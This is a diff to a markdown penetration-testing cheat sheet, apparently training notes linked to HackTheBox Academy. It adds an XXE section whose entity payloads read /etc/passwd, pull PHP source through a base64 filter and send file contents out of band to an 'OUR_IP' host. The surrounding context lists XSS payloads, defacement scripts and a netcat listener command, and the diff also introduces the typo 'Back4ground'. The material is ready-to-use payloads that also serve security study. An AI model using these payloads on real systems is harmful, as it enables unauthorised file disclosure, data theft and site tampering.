@@ -1191,7 +1191,7 @@ url=%26%2302java%26%23115cript:alert(document.domain)
 | `<script>print()</script>`                                 | Basic XSS Payload                                 |
 | `<img src="" onerror=alert(window.origin)>`                | HTML-based XSS Payload                            |
 | `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color                        |
-| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image    |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Back4ground Image    |
 | `<script>document.title = 'HackTheBox Academy'</script>`   | Change Website Title                              |
 | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body           |
 | `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element           |
@@ -1201,6 +1201,18 @@ url=%26%2302java%26%23115cript:alert(document.domain)
 | `sudo nc -lvnp 80`                                        | Start netcat listener                             |
 | `sudo php -S 0.0.0.0:80`                                  | Start PHP server                                  |
 
+
+### XXE
+
+| Code                                                                      | Description                                      |
+|---------------------------------------------------------------------------|--------------------------------------------------|
+| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                       | Define External Entity to a URL                  |
+| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                               | Define External Entity to a file path            |
+| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter  |
+| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error              |
+| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltr                      |
+
+[Hacktricks on XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
 
 ### Other web vulnerabilities
 
